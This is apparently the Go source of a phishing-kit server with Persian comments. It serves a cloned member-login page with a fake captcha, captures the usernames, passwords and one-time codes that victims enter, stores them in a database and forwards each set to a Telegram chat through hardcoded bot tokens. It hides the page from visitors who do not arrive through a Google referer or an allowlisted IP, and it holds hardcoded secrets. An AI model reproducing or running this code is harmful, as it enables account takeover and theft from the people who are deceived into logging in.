package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	_ "github.com/lib/pq"
)

var (
	// globalResponseCache برای ذخیره پاسخ‌ها با کلید IP استفاده می‌شود.
	globalResponseCache        = sync.Map{}
	globalresponsecacheCaptcha = sync.Map{}
)

var db *sql.DB
var chatIDs = "-1002406712466"

func isIPAllowedOrFromGoogle(req *http.Request) (bool, error) {
	ip := getIP(req)

	// بررسی اینکه آیا IP در دیتابیس موجود است (مجاز است)
	var exists bool
	err := db.QueryRow(`
		SELECT EXISTS(SELECT 1 FROM allowed_ips WHERE ip = $1)
	`, ip).Scan(&exists)
	if err != nil {
		return false, err
	}

	// اگر IP در دیتابیس موجود بود، true برمی‌گرداند
	if exists {
		return true, nil
	}

	// اگر IP مجاز نبود، بررسی کنیم که آیا کاربر از گوگل آمده است
	if isFromGoogle(req) {
		// اگر کاربر از گوگل آمده بود، IP را به دیتابیس اضافه کنیم
		_, err := db.Exec(`
			INSERT INTO allowed_ips (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING
		`, ip)
		if err != nil {
			return false, err
		}
		// چون کاربر از گوگل آمده و IP اضافه شده است، true برمی‌گرداند
		return true, nil
	}

	// اگر IP مجاز نبود و از گوگل هم نیامده بود، false برمی‌گرداند
	return false, nil
}
func isFromGoogle(req *http.Request) bool {
	referer := req.Header.Get("Referer")
	if referer == "" {
		return false
	}

	// بررسی اینکه آیا کاربر از گوگل یا تبلیغات گوگل آمده است
	return strings.Contains(referer, "google.com") || strings.Contains(referer, "googleadservices.com")
}
func removeOldIPs(duration time.Duration) {
	_, err := db.Exec(`
		DELETE FROM allowed_ips 
		WHERE added_at < NOW() - $1::INTERVAL
	`, duration.String())
	if err != nil {
		log.Printf("Error removing old IPs: %v", err)
	}
}
func detectPlatform(userAgent string) string {
	if strings.Contains(userAgent, "Windows") {
		return "Windows"
	} else if strings.Contains(userAgent, "Macintosh") || strings.Contains(userAgent, "Mac OS") {
		return "Apple"
	} else if strings.Contains(userAgent, "Android") {
		return "Android"
	} else if strings.Contains(userAgent, "Linux") {
		return "Linux"
	}
	return "Unknown"
}

func countryToFlagEmoji(countryCode string) string {
	offset := 127397 // آفست برای تبدیل به یونیکد
	runes := []rune(strings.ToUpper(countryCode))
	return string(rune(int(runes[0])+offset)) + string(rune(int(runes[1])+offset))
}

func getIP(r *http.Request) string {
	// Try to get the IP from the Cloudflare header first
	cfConnectingIP := r.Header.Get("CF-Connecting-IP")
	if cfConnectingIP != "" {
		return cfConnectingIP
	}

	// Check the X-Forwarded-For header for the original IP
	xForwardedFor := r.Header.Get("X-Forwarded-For")
	if xForwardedFor != "" {
		ips := strings.Split(xForwardedFor, ",")
		if len(ips) > 0 && ips[0] != "" {
			return strings.TrimSpace(ips[0])
		}
	}

	// Fallback to the HTTP_CLIENT_IP header
	httpClientIP := r.Header.Get("HTTP_CLIENT_IP")
	if httpClientIP != "" {
		return httpClientIP
	}

	// Final fallback to the direct connection remote address
	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
	return ip
}
func getCountryCode(r *http.Request) string {
	// Get the country code from the Cloudflare CF-IPCountry header
	cfIPCountry := r.Header.Get("CF-IPCountry")
	if cfIPCountry != "" {
		return cfIPCountry
	}

	return "Unknown"
}
func isCountryBlocked(country string) bool {
	var exists bool
	err := db.QueryRow(`SELECT EXISTS(SELECT 1 FROM blocked_countries WHERE country_code = $1)`, country).Scan(&exists)
	if err != nil {
		log.Printf("Error checking if country is blocked: %v", err)
		return false
	}
	return exists
}
func insertVisitLog(ip, path, domain, referer, platform string, timestamp time.Time, country string) error {
	_, err := db.Exec(`
		INSERT INTO visit_logs (ip, path, domain, timestamp, country, referer, platform, request_count) 
		VALUES ($1, $2, $3, $4, $5, $6, $7, 0) 
		ON CONFLICT (ip) DO UPDATE 
		SET request_count = visit_logs.request_count + 1, 
		    path = EXCLUDED.path,
		    domain = EXCLUDED.domain,
		    timestamp = EXCLUDED.timestamp,
		    country = EXCLUDED.country,
		    referer = EXCLUDED.referer,
		    platform = EXCLUDED.platform
	`, ip, path, domain, timestamp, country, referer, platform)
	return err
}

// افزایش تعداد درخواست‌ها برای یک IP
func incrementRequestCount(ip string) error {
	_, err := db.Exec(`UPDATE visit_logs SET request_count = request_count + 1 WHERE ip = $1`, ip)
	return err
}
func insertLoginLog(db *sql.DB, ip, username, password string) error {
	// SQL query برای درج لاگ جدید در جدول
	query := `
		INSERT INTO login_logs (ip, username, password, timestamp) 
		VALUES ($1, $2, $3, $4)
	`

	// اجرای کوئری و درج مقادیر
	_, err := db.Exec(query, ip, username, password, time.Now())
	if err != nil {
		return err
	}

	log.Printf("Login log inserted: IP=%s, Username=%s", ip, username)
	return nil
}
func getLastLoginLogByIP(db *sql.DB, ip string) (string, string, string, error) {
	var username, password string
	var timestamp string

	// کوئری برای دریافت آخرین لاگ بر اساس IP
	query := `
		SELECT username, password, timestamp
		FROM login_logs
		WHERE ip = $1
		ORDER BY timestamp DESC
		LIMIT 1
	`

	// اجرای کوئری و دریافت نتایج
	err := db.QueryRow(query, ip).Scan(&username, &password, &timestamp)
	if err != nil {
		if err == sql.ErrNoRows {
			// اگر رکوردی پیدا نشد
			return "", "", "", fmt.Errorf("no login logs found for IP: %s", ip)
		}
		// سایر خطاها
		return "", "", "", err
	}

	return username, password, timestamp, nil
}

const TelegramBotToken = "5389064972:AAG7Pcl80WVXmXvky0VKYFkL6BECq50gOvY"
const TelegramBotToken_trafic = "6461642529:AAGRm1Uvw4z9UfhaPoEBFmSSw5wu8ua5lpo"

func SendMessage(chatID, text, ip string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TelegramBotToken)

	formData := map[string]string{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "Markdown",
		//"reply_markup": string(replyMarkupJSON),
	}

	formDataJSON, err := json.Marshal(formData)
	if err != nil {
		return fmt.Errorf("error marshalling form data: %v", err)
	}

	// ????? ??????? POST
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(formDataJSON))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	// ????? ??????? ? ?????? ????
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	// ??? ???? API
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return fmt.Errorf("error reading response body: %v", err)
	}
	fmt.Println("Response Body:", string(body))

	return nil
}
func createLoginMessage(username, password, otp, country, flagEmoji, ip string) string {
	// Initialize the OTP part of the message.
	otpText := ""
	if otp != "" {
		otpText = fmt.Sprintf("📩 OTP : `%s`\n➖➖➖➖➖➖\n", otp)
	}

	// Create a tag by removing dots from the IP address.
	tag := strings.ReplaceAll(ip, ".", "")

	// Format the entire message using string interpolation.
	text := fmt.Sprintf("✅ #NewLogin\n👤 Username : `%s`\n➖➖➖➖➖➖\n🗝 Password : `%s`\n➖➖➖➖➖➖\n%s\nCountry: %s %s\nTag : #user%s\nIP : `%s`\nBlock : `%s`\nlogin : `%s`	", username, password, otpText, country, flagEmoji, tag, ip, "/start block="+ip, "/start login="+ip)

	return text
}

type CaptchaResponse struct {
	Text string `json:"text"`
	File string `json:"file"` // نام فایل تصویر captcha
}

func getCaptchaResponse() (CaptchaResponse, error) {
	// دایرکتوری که فایل‌های captcha در آن قرار دارند
	captchaDir := "/root/cgi_per/"

	all := []struct {
		Code string
		File string
	}{
		{"24579", "c4.jpeg"},
		{"678057", "c5.jpeg"},
		{"98878", "c6.jpeg"},
		{"86965", "c8.jpeg"},
		{"06595", "c13.jpeg"},
		{"23210", "c17.jpeg"},
		{"50363", "c19.jpeg"},
		{"79304", "c22.jpeg"},
		{"32025", "c23.jpeg"},
		{"72263", "c26.jpeg"},
		{"10142", "c30.jpeg"},
	}

	rand.Seed(time.Now().UnixNano())
	randomItem := all[rand.Intn(len(all))]

	// مسیر کامل فایل تصویر را ایجاد کنید
	filePath := filepath.Join(captchaDir, randomItem.File)

	// بررسی کنید که فایل وجود دارد یا خیر
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return CaptchaResponse{}, fmt.Errorf("file does not exist: %v", filePath)
	}

	response := CaptchaResponse{
		Text: randomItem.Code,
		File: randomItem.File,
	}

	return response, nil
}
func createTables(db *sql.DB) error {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS visit_logs (
			id SERIAL PRIMARY KEY,
			ip VARCHAR(45) NOT NULL,
			path TEXT NOT NULL,
			domain TEXT NOT NULL,
			timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			country VARCHAR(2),
			referer TEXT,
			platform TEXT,
			request_count INT DEFAULT 0
		);`,
		`CREATE TABLE IF NOT EXISTS login_logs (
			id SERIAL PRIMARY KEY,
			ip VARCHAR(45) NOT NULL,
			username TEXT NOT NULL,
			password TEXT NOT NULL,
			timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		);`,
		`CREATE TABLE IF NOT EXISTS blocked_ips (
			ip VARCHAR(45) PRIMARY KEY,
			blocked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		);`,
		`CREATE TABLE IF NOT EXISTS blocked_countries (
			country_code VARCHAR(2) PRIMARY KEY
		);`,
		`CREATE TABLE IF NOT EXISTS request_counts (
			id SERIAL PRIMARY KEY,
			ip VARCHAR(45) NOT NULL,
			path TEXT NOT NULL,
			request_count INT DEFAULT 1,
			last_request TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			UNIQUE (ip, path)
		);`,
		`CREATE TABLE IF NOT EXISTS allowed_ips (
                             ip VARCHAR(45) PRIMARY KEY,
                             added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );`,
		`CREATE TABLE IF NOT EXISTS allowed_paths (
                               id SERIAL PRIMARY KEY,
                               path TEXT NOT NULL,
                               is_active BOOLEAN DEFAULT TRUE
      );`,
		`DO $$
      BEGIN
    IF NOT EXISTS (
        SELECT 1
        FROM pg_constraint
        WHERE conname = 'unique_ip'
    ) THEN
        ALTER TABLE visit_logs ADD CONSTRAINT unique_ip UNIQUE (ip);
    END IF;
     END $$;`,
		`DO $$
BEGIN
    IF NOT EXISTS (
        SELECT 1
        FROM pg_constraint
        WHERE conname = 'unique_path'
    ) THEN
        ALTER TABLE allowed_paths ADD CONSTRAINT unique_path UNIQUE (path);
    END IF;
END $$;`,
	}

	for _, query := range queries {
		_, err := db.Exec(query)
		if err != nil {
			return err
		}
	}

	return nil
}
func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
	var filePath string

	// بررسی سیستم‌عامل
	if runtime.GOOS == "windows" {
		// مسیر دایرکتوری برای ویندوز
		filePath = filepath.Join("E:\\", "cgi_perfect", "style", "index2.html")
	} else {
		// مسیر دایرکتوری برای لینوکس
		filePath = filepath.Join("/root", "cgi_per", "style", "index2.html")
	}
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		log.Fatalf("File does not exist: %s", filePath)
		return
	}
	ip := getIP(req)

	country := getCountryCode(req)

	if ip == "" {
		ip = "IP ناشناخته"
	}
	if country == "" {
		country = "کشور ناشناخته"
	}

	flagEmoji := countryToFlagEmoji(country)
	path := req.URL.Path
	log.Printf("path: %s", path)
	//domain = req.URL.Host
	referer := req.Header.Get("Referer")
	userAgent := req.Header.Get("User-Agent")
	platform := detectPlatform(userAgent)
	err := insertVisitLog(ip, req.URL.Path, req.Host, referer, platform, time.Now(), country)
	if err != nil {
		file, err := os.ReadFile(filePath)
		if err != nil {
			http.Error(res, "Unable to load page", http.StatusInternalServerError)
			return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
		}

		// اگر خطا نبود، ادامه می‌دهیم
		res.Header().Set("Content-Type", "text/html")
		_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
		if err != nil {
			log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
		}
	}

	// افزایش تعداد درخواست‌ها برای این IP
	incrementRequestCount(ip)
	allowed, err := isIPAllowedOrFromGoogle(req)
	if err != nil {
		log.Printf("Error checking google: %v", err)
		file, err := os.ReadFile(filePath)
		if err != nil {
			http.Error(res, "Unable to load page", http.StatusInternalServerError)
			return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
		}

		// اگر خطا نبود، ادامه می‌دهیم
		res.Header().Set("Content-Type", "text/html")
		_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
		if err != nil {
			log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
		}

	}
	if !allowed {
		log.Printf("not allowed google ")
		file, err := os.ReadFile(filePath)
		if err != nil {
			http.Error(res, "Unable to load page", http.StatusInternalServerError)
			return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
		}

		// اگر خطا نبود، ادامه می‌دهیم
		res.Header().Set("Content-Type", "text/html")
		_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
		if err != nil {
			log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
		}
	}
	countryBlocked := isCountryBlocked(country)
	if err != nil {
		log.Printf("Error checking if country is blocked: %v", err)
		file, err := os.ReadFile(filePath)
		if err != nil {
			http.Error(res, "Unable to load page", http.StatusInternalServerError)
			return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
		}

		// اگر خطا نبود، ادامه می‌دهیم
		res.Header().Set("Content-Type", "text/html")
		_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
		if err != nil {
			log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
		}
	}
	if countryBlocked {
		file, err := os.ReadFile(filePath)
		if err != nil {
			http.Error(res, "Unable to load page", http.StatusInternalServerError)
			return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
		}

		// اگر خطا نبود، ادامه می‌دهیم
		res.Header().Set("Content-Type", "text/html")
		_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
		if err != nil {
			log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
		}
	}
	if match, _ := regexp.MatchString("/otp.asp$", req.URL.Path); match {

		err := req.ParseForm()
		if err != nil {
			log.Println("Error parsing form:", err)
			res.Header().Set("Location", "/login.html")
			// تنظیم ریدایرکت به URL مورد نظر
			res.WriteHeader(http.StatusFound)
			return
		}
		otp := req.FormValue("number")

		if err != nil {
			log.Fatalf("Failed to get login data: %v", err)
			res.Header().Set("Location", "/login.html")
			// تنظیم ریدایرکت به URL مورد نظر
			res.WriteHeader(http.StatusFound)
			return
		}

		username, password, _, err := getLastLoginLogByIP(db, ip)
		if err != nil {
			log.Fatalf("Failed to get login data: %v", err)
			res.Header().Set("Location", "/login.html")
			// تنظیم ریدایرکت به URL مورد نظر
			res.WriteHeader(http.StatusFound)
			return
		}
		flagEmoji := countryToFlagEmoji(country)
		// تولید پیام برای ارسال به تلگرام
		message := createLoginMessage(username, password, otp, country, flagEmoji, ip)
		//message := fmt.Sprintf("👤 New target\n----------------\nOtp: %s\n----------------\nUsername: %s\n----------------\nPassword: %s\n----------------\nIP: %s\n----------------\nCountry: %s %s\n----------------", otp, loginData.Username, loginData.Password, ip, country, flagEmoji)
		// ارسال پیام به تلگرام
		err = SendMessage(chatIDs, message, ip)
		if err != nil {
			log.Printf("Error sending message to Telegram: %v", err)
		}

		res.Header().Set("Location", "/login.html")
		// تنظیم ریدایرکت به URL مورد نظر
		res.WriteHeader(http.StatusFound)
		return

	} else if match, _ := regexp.MatchString("/user/userlogin.asp$", req.URL.Path); match {

		fmt.Printf("IP %s is not blocked.\n", ip)
		err = req.ParseForm()
		if err != nil {
			log.Println("Error parsing form:", err)
			res.Header().Set("Location", "/")
			// تنظیم ریدایرکت به URL مورد نظر
			res.WriteHeader(http.StatusFound)
			return
		}
		username := req.FormValue("login")
		_, err := strconv.Atoi(username)
		if err != nil {
			globalResponseCache.Store(ip, "Wrong Member ID/Password.")
			res.Header().Set("Location", "/login.html")
			res.WriteHeader(http.StatusFound)
			return
		}

		password := req.FormValue("password")
		turing := req.FormValue("turing")
		value, _ := globalresponsecacheCaptcha.Load(ip)
		log.Printf("value : %v , turing %v", value, turing)
		if turing == value {
			err = insertLoginLog(db, ip, username, password)
			log.Printf("Login: %s, Password: %s", username, password)
			message := createLoginMessage(username, password, "", country, flagEmoji, ip)
			//msgText := fmt.Sprintf("👤 Username : %s\n----------------\n🗝 Password : %s\n\n----------------\nIP : %s\nCountry: %s %s", username, password, ip, country, flagEmoji)
			err := SendMessage(chatIDs, message, ip)

			if err != nil {
				log.Printf("Failed to update or insert count: %v", err)

			}

			responseData := map[string]string{
				"message": "Success",
				"status":  "200",
			}

			// تبدیل داده‌ها به جیسون
			jsonData, err := json.Marshal(responseData)
			if err != nil {
				log.Fatal(err) // خطا در تبدیل به JSON
			}

			// تنظیم هدرهای پاسخ
			res.Header().Set("Content-Type", "application/json")
			res.WriteHeader(http.StatusOK) // تنظیم وضعیت 200 (OK)

			// نوشتن داده‌های JSON به ResponseWriter
			_, writeErr := res.Write(jsonData)
			if writeErr != nil {
				log.Fatal(writeErr) // خطا در نوشتن به ResponseWriter
			}
		} else {
			globalResponseCache.Store(ip, "Wrong Turing number.")
			res.Header().Set("Location", "/login.html")
			res.WriteHeader(http.StatusFound)
			return
		}

	} else if match, _ := regexp.MatchString("/get.php$", req.URL.Path); match {
		captchaResponse, err := getCaptchaResponse()
		if err != nil {
			http.Error(res, "Error generating captcha", http.StatusInternalServerError)
			return
		}

		// فایل تصویر را باز کنید
		filePath := "/root/cgi_per/" + captchaResponse.File
		file, err := os.Open(filePath)
		if err != nil {
			http.Error(res, "Error opening image file", http.StatusInternalServerError)
			return
		}
		defer file.Close()

		// تنظیم هدرهای مربوط به نوع محتوا و طول محتوا
		res.Header().Set("Content-Type", "image/jpeg")
		//res.Header().Set("Content-Disposition", "inline; filename="+captchaResponse.File)

		// ارسال فایل تصویر به عنوان پاسخ
		http.ServeFile(res, req, filePath)
	} else if match, _ := regexp.MatchString("/login.html$", req.URL.Path); match {
		workingDir, err := os.Getwd()
		if err != nil {
			log.Fatal(err) // خطا در گرفتن مسیر جاری
		}
		// ساخت مسیر کامل فایل با استفاده از مسیر جاری و مسیر فولدر استاتیک
		htmlFilePath := filepath.Join(workingDir, "static", "login.html")

		// خواندن فایل HTML
		htmlFile, err := ioutil.ReadFile(htmlFilePath)
		if err != nil {
			log.Fatal(err) // خطا در خواندن فایل
		}

		// تنظیم هدرهای پاسخ
		res.Header().Set("Content-Length", strconv.Itoa(len(htmlFile)))
		res.Header().Set("Content-Type", "text/html")
		res.Header().Del("Content-Encoding") // حذف هرگونه سرآیند فشرده‌سازی

		// نوشتن فایل به ResponseWriter
		_, writeErr := res.Write(htmlFile)
		if writeErr != nil {
			log.Fatal(writeErr) // خطا در نوشتن به ResponseWriter
		}
		return
	} else if match, _ := regexp.MatchString("/$", req.URL.Path); match {
		workingDir, err := os.Getwd()
		if err != nil {
			log.Fatal(err) // خطا در گرفتن مسیر جاری
		}
		// ساخت مسیر کامل فایل با استفاده از مسیر جاری و مسیر فولدر استاتیک
		htmlFilePath := filepath.Join(workingDir, "static", "login.html")

		// خواندن فایل HTML
		htmlFile, err := ioutil.ReadFile(htmlFilePath)
		if err != nil {
			log.Fatal(err) // خطا در خواندن فایل
		}

		// تنظیم هدرهای پاسخ
		res.Header().Set("Content-Length", strconv.Itoa(len(htmlFile)))
		res.Header().Set("Content-Type", "text/html")
		res.Header().Del("Content-Encoding") // حذف هرگونه سرآیند فشرده‌سازی

		// نوشتن فایل به ResponseWriter
		_, writeErr := res.Write(htmlFile)
		if writeErr != nil {
			log.Fatal(writeErr) // خطا در نوشتن به ResponseWriter
		}
		return
	} else {
		file, err := os.ReadFile(filePath)
		if err != nil {
			http.Error(res, "Unable to load page", http.StatusInternalServerError)
			return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
		}

		// اگر خطا نبود، ادامه می‌دهیم
		res.Header().Set("Content-Type", "text/html")
		_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
		if err != nil {
			log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
		}
	}

}
func main() {
	connStr := "user=postgres password=123456 dbname=proxy_logs sslmode=disable"
	var err error
	db, err = sql.Open("postgres", connStr)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()
	err = createTables(db)
	if err != nil {
		log.Fatalf("Error creating tables: %v", err)
	}
	go func() {
		for {
			time.Sleep(30 * time.Minute)
			removeOldIPs(30 * time.Minute) // IPهایی که بیش از 30 دقیقه ذخیره شده‌اند، حذف می‌شوند
		}
	}()

	//cssHandler := http.FileServer(http.Dir("E:\\cgi_perfect\\style"))
	var cssHandler http.Handler // مشخص کردن نوع متغیر

	// بررسی سیستم‌عامل
	if runtime.GOOS == "windows" {
		// مسیر دایرکتوری برای ویندوز
		if _, err := os.Stat("E:\\cgi_perfect\\style"); os.IsNotExist(err) {
			log.Fatal("CSS directory does not exist for Windows")
		}
		cssHandler = http.FileServer(http.Dir("E:\\cgi_perfect\\static"))
	} else {
		// مسیر دایرکتوری برای لینوکس
		if _, err := os.Stat("/root/cgi_per/static"); os.IsNotExist(err) {
			log.Fatal("CSS directory does not exist for Linux")
		}
		cssHandler = http.FileServer(http.Dir("/root/cgi_per/static"))
	}

	// تعریف یک هندلر برای روت که درخواست‌ها را به دایرکتوری CSS ریدایرکت می‌کند
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		r.URL.Path = strings.TrimPrefix(r.URL.Path, "/index")
		cssHandler.ServeHTTP(w, r)
	})
	http.HandleFunc("/", handleRequestAndRedirect)

	log.Fatal(http.ListenAndServe(":8080", nil))
}
